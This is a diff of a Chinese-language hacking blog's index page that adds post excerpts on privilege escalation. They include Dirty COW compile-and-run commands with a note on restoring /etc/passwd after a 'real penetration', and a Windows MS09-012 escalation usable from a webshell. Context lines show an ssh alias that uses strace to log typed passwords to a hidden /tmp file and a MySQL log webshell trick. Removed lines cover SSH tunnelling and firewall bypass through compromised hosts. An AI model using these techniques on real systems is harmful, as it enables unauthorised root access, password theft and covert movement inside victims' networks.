@@ -139,6 +139,69 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/04/22/dirty/">
+                linux 溢出提权小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/exp/">exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记:</div><div class="line">实际渗透中,提的成功率相对来讲还是蛮高的,屡试不爽,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </div><div class="line"></div><div class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">$ ./dirty admin</div><div class="line">$ su firefart</div><div class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd	干完活,一定要记得把东西还原回来,exp已经有相应的msf模块可用,大家请自行尝试</span></div><div class="line"><span class="comment"># exit</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/22/dirty/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/04/22/win-0day-privilege/">
+                windows 溢出提权小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/exp/">exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;平时用的相对比较多,就顺手自己记录了一份,不大完整,关键是大家能用上就好,都是一些已知的windows 0day exp,关于各个漏洞的详情,请自行查阅微软安全公告,链接如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/technet.microsoft.com/zh</span>-cn/library/security/dn639106.aspx</div></pre></td></tr></table></figure></p>
+<p>0x02 具体exp利用如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">RPCSS服务没有正确地隔离NetworkService或LocalService帐号下运行的进程,导致本地攻击者可以利用令牌劫持的方式获得权限提升</div><div class="line">漏洞代号: MS09-<span class="number">012</span></div><div class="line">补丁编号: KB952004</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 针对<span class="number">03</span>以下系统,菜刀可用</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/22/win-0day-privilege/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/03/24/mysql-log-write-webshell/">
                 利用mysql的general log 写shell[突破into outfile]
             </a>
@@ -548,72 +611,6 @@
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alias</span> ssh=<span class="string">'strace -o /tmp/.sshpwd-`date '</span>+%d%h%m%s<span class="string">'`.log -s 2048 ssh'</span></div></pre></td></tr></table></figure>
         </div>
         <a href="/2016/09/22/strace/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/21/ssh-portforward/">
-                通向彼岸 之内网代理转发 [ ssh隧道 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-21</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/ssh-portforwd/">ssh portforwd</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 此次用于实验的大致环境,如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">lnmp01</span> 	<span class="selector-attr">[centOS6.8_x64]</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.30</span>  	假设为自己公网的<span class="selector-tag">vps</span><span class="selector-attr">[一般都会用一台公网的linux肉鸡]</span>,等会儿主要用来负责<span class="selector-tag">ssh</span>转发</div><div class="line"><span class="selector-tag">MidLAMP</span> <span class="selector-attr">[centOS6.8_x64]</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.193</span>	假设为目标内网中的一台<span class="selector-tag">linux</span>机器,能正常连公网</div><div class="line"><span class="selector-tag">win2008cn</span>			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.170</span>	假设为目标内网中的一台<span class="selector-tag">windows</span>机器,不能连公网</div><div class="line"><span class="selector-tag">win2008R2cn</span> 			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span>	假设为目标公网中的一台<span class="selector-tag">windows</span>机器,<span class="selector-tag">rdp</span>只能通过192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.x</span>这个<span class="selector-tag">ip</span>段访问</div><div class="line"><span class="selector-tag">win7en</span> 				<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.195</span>	假设为自己本地内网中的一台<span class="selector-tag">windows</span>机器</div><div class="line"><span class="selector-tag">win7en_bak</span>			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.17</span>	假设为自己公网的另一台<span class="selector-tag">windows</span>机器</div></pre></td></tr></table></figure></p>
-<p>0x02 关于ssh 工具本身选项用途简介 [更多详情,请自行man ssh,帮助手册里面说的非常详细]:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">C  压缩传输数据,加快传输速度</span></div><div class="line">-<span class="ruby">f  后台对用户名密码进行认证</span></div><div class="line">-<span class="ruby">N  仅仅只用来转发,不用再弹回一个新的shell</span></div><div class="line">-<span class="ruby">n  后台运行</span></div><div class="line">-<span class="ruby">q  安静模式,不要显示警告等信息</span></div><div class="line">-<span class="ruby">l  指定ssh登录名</span></div><div class="line">-<span class="ruby">g  允许远程主机连接到本地转发的端口     </span></div><div class="line">-<span class="ruby">L  进行本地端口转发</span></div><div class="line">-<span class="ruby">R  进行远程端口转发</span></div><div class="line">-<span class="ruby">D  动态转发,即socks代理</span></div><div class="line">-<span class="ruby">T  禁止分配伪终端</span></div><div class="line">-<span class="ruby">p  指定远程ssh服务端口</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/21/ssh-portforward/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/20/fpipe-redirect-port/">
-                通向彼岸 之内网代理转发 [ 利用端口重定向bypass各类应用层防火墙 fpipe ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-20</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/fpipe/">fpipe</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得netsh和iptables配置稍微有点儿繁琐,有款小工具可能会适合你,fpipe 一款专门用于端口重定向的小工具,从名字就能猜出来它是干啥的,很明显,forward pipe[转发,通过管道],虽然功能上和netsh有一点点类似,但确实不是一类东西,同样是监听来自外部的某个端口,但它多做了一步,它会把来自外部端口的流量先转到本地某个指定的端口上[转发],再通过转到的这个本地端口去连远程机器的某个端口[管道],而不是像netsh只是单纯的把端口转过去,简易通信流程如下</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">外部端口访问 <span class="tag">&lt;<span class="name">-</span>&gt;</span> 本地监听来自外部的这个端口并它转到本地的另一个端口上(在本地绑定两个端口) <span class="tag">&lt;<span class="name">-</span>&gt;</span> 通过本地的另一个端口和远程机器的某个端口通信</div></pre></td></tr></table></figure>
-<p>工具选项如下,非常简单,看选项说明基本就懂了:<br><img src="/img/fpipe help.png" alt=""></p>
-<p>0x02 我们可以拿它来做什么<br>&nbsp;&nbsp;&nbsp;&nbsp;刚刚在上面已经说过,它并非直接转发,而是又自己建立了一个新的通道,这样的好处在哪里呢,很明显,我们可以通过这样的方式来轻松bypass掉各类应用层防火墙</p>
-        </div>
-        <a href="/2016/09/20/fpipe-redirect-port/" class="read-more">Read More</a>
     
 
 </div>
